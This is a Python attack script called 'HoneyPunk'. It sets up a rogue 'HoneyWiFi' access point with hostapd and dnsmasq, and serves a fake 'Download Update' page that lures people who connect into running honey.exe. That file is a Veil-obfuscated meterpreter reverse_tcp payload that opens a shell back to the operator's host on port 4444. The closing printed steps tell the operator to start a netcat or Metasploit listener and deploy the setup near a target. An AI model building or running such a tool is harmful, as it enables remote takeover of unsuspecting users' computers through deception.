#!/usr/bin/env python3

import subprocess
import sys
import time
import os
import logging

HONEYPUNK_LOGO = """
   ██╗  ██╗ ██████╗ ███╗   ██╗███████╗██╗   ██╗██████╗ ██╗   ██╗███╗   ██╗██╗  ██╗
   ██║  ██║██╔═══██╗████╗  ██║██╔════╝██║   ██║██╔══██╗██║   ██║████╗  ██║██║ ██╔╝
   ███████║██║   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║   ██║██╔██╗ ██║█████╔╝ 
   ██╔══██║██║   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔═══╝ ██║   ██║██║╚██╗██║██╔═██╗ 
   ██║  ██║╚██████╔╝██║ ╚████║███████╗╚██████╔╝██║     ╚██████╔╝██║ ╚████║██║  ██╗
   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝
   --------------------------------------------------------------------------------
      HONEYPUNK - Red Team WiFi Honeypot | Lure & Exploit | Powered by Kali
   --------------------------------------------------------------------------------
"""

logging.basicConfig(filename="honeypunk.log", level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
logger = logging.getLogger("HoneyPunk")

IFACE = "wlan0"
LHOST = input("Enter your public IP or hostname: ").strip()
LPORT = "4444"
PAYLOAD_FILE = "/tmp/honeypunk_veil.exe"
HTML_FILE = "index.html"

def generate_veil_payload():
    try:
        logger.info(f"Generating Veil payload: {PAYLOAD_FILE}")
        veil_cmd = f"use Evasion\nuse windows/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nset use_arya Y\ngenerate\nset output_file {PAYLOAD_FILE}\nexecute\nexit"
        with open("veil.rc", "w") as f:
            f.write(veil_cmd)
        subprocess.run(["veil", "-r", "veil.rc"], check=True)
        if not os.path.exists(PAYLOAD_FILE):
            raise FileNotFoundError
        logger.info(f"Payload generated: {PAYLOAD_FILE}")
    except Exception as e:
        logger.error(f"Payload generation failed: {e}")
        sys.exit(1)

def setup_honeypot():
    try:
        # Hostapd config
        with open("hostapd.conf", "w") as f:
            f.write(f"interface={IFACE}\ndriver=nl80211\nssid=HoneyWiFi\nhw_mode=g\nchannel=6\n")
        subprocess.Popen(["hostapd", "hostapd.conf"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Dnsmasq config
        with open("dnsmasq.conf", "w") as f:
            f.write("interface=wlan0\ndhcp-range=192.168.1.2,192.168.1.100,12h\n")
        subprocess.Popen(["dnsmasq", "-C", "dnsmasq.conf"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Web server with payload
        with open(HTML_FILE, "w") as f:
            f.write(f"<h1>Free WiFi - Download Update</h1><a href='http://{LHOST}/honey.exe'>Click Here</a>")
        subprocess.Popen(["python3", "-m", "http.server", "80"], cwd="/tmp")
        
        logger.info("Honeypot AP and web server running")
    except Exception as e:
        logger.error(f"Honeypot setup failed: {e}")
        sys.exit(1)

def main():
    print(HONEYPUNK_LOGO)
    logger.info("HoneyPunk initialized")
    generate_veil_payload()
    setup_honeypot()
    
    print(f"[!] Move {PAYLOAD_FILE} to /tmp and rename to honey.exe")
    print("[!] Start listener: 'nc -lvp 4444' or Metasploit")
    print("[!] Deploy near target—wait for connection")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("User interrupted")
        for f in ["hostapd.conf", "dnsmasq.conf", "veil.rc", HTML_FILE]:
            if os.path.exists(f):
                os.remove(f)
        sys.exit(0)

if __name__ == "__main__":
    main()